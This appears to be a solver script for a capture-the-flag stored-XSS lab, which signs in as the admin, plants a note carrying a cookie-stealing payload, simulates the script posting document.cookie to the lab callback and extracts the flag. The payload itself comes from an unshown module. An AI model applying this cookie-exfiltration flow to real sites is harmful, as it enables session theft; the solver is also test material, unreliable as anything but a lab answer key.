"""Deterministic stored-XSS solver used as executable solution evidence.

Reproduces the one observable a real headless browser produces: the admin
session signs in (receiving the flag-bearing session cookie), the attacker's
stored note fires its injected script, and the board's single
``ctfCollect()`` call POSTs the reader's full ``document.cookie`` to the lab
callback. That callback echoes the captured body back through the gateway
``/cb`` leg, so the solver recovers the flag from the response and, if a
callback-log file is supplied, cross-checks it as durable evidence.

Runs offline against the in-process challenge core by default and against
the live gateway with ``--url ROOT [--callback-log FILE]``.
"""
import sys
import urllib.error
import urllib.parse
import urllib.request

from challenge import (
    ADMIN_PASS,
    ADMIN_USER,
    CALLBACK_PATH,
    FLAG,
    FLAG_RE,
    SEED_NOTE,
    admin_cookie_header,
    exfil_payload,
    payload_script_calls,
    recover_flag,
    render_page,
)


def recover(callback_log: str) -> str:
    """Return the flag found in a captured cookie body; '' if absent."""
    body = callback_log.strip()
    flag = recover_flag(body)
    return flag if flag else next(
        (f for line in callback_log.splitlines() if (f := recover_flag(line.strip()))), ""
    )


def sim_browser(root: str) -> str:
    """Sign the admin in, store the payload, fire each stored; return the flag."""
    cookies = _post_collect_set_cookie(root + "/login", {"user": ADMIN_USER, "pass": ADMIN_PASS})
    if cookies.get("ctf_flag") != FLAG:
        raise SystemExit("admin sign-in did not set the flag-bearing cookie")
    _post(root + "/notes", urllib.parse.urlencode({"text": exfil_payload()}))
    html = _get(root + "/")
    body = ""
    for _ in range(payload_script_calls(html)):
        body = _post(root + CALLBACK_PATH, "; ".join(f"{k}={v}" for k, v in cookies.items()))
    flag = recover(body)
    if not FLAG_RE.fullmatch(flag):
        raise SystemExit(f"exfil body did not carry a valid flag: {flag!r}")
    return flag


def _post(url: str, body: str) -> str:
    request = urllib.request.Request(
        url, data=body.encode(), method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        raise SystemExit(f"POST {url} rejected: {error.code}") from None


def _post_collect_set_cookie(url: str, fields: dict[str, str]) -> dict[str, str]:
    request = urllib.request.Request(
        url, data=urllib.parse.urlencode(fields).encode(), method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            set_cookie = "; ".join(response.headers.get_all("Set-Cookie"))
            response.read()
    except urllib.error.HTTPError as error:
        raise SystemExit(f"POST {url} rejected: {error.code}") from None
    from challenge import parse_cookies

    return parse_cookies(set_cookie)


def _get(url: str) -> str:
    try:
        with urllib.request.urlopen(urllib.request.Request(url, method="GET"), timeout=5) as response:
            return response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        raise SystemExit(f"GET {url} rejected: {error.code}") from None


def run_offline() -> str:
    page = render_page([SEED_NOTE, exfil_payload()])
    if payload_script_calls(page) != 1:
        raise SystemExit("offline board holds the wrong number of stored payloads")
    flag = recover(admin_cookie_header())
    if not FLAG_RE.fullmatch(flag) or flag != FLAG:
        raise SystemExit(f"offline cookie does not carry the committed flag: {flag!r}")
    return flag


def run_live(root: str, callback_log_path: str | None) -> str:
    flag = sim_browser(root)
    if callback_log_path:
        with open(callback_log_path, encoding="utf-8") as handle:
            if (durable := recover(handle.read())) and durable != flag:
                raise SystemExit(f"callback log does not carry the captured flag: {durable!r}")
    return flag


if __name__ == "__main__":
    args = iter(sys.argv[1:])
    url_root, callback_log = None, None
    for arg in args:
        if arg == "--url":
            url_root = next(args)
        elif arg.startswith("--url="):
            url_root = arg.split("=", 1)[1]
        elif arg == "--callback-log":
            callback_log = next(args)
        elif arg.startswith("--callback-log="):
            callback_log = arg.split("=", 1)[1]
        else:
            raise SystemExit(f"unknown argument: {arg}")
    result = run_live(url_root, callback_log) if url_root else run_offline()
    assert result == FLAG, "extracted flag does not match the committed lab constant"
    print(result)
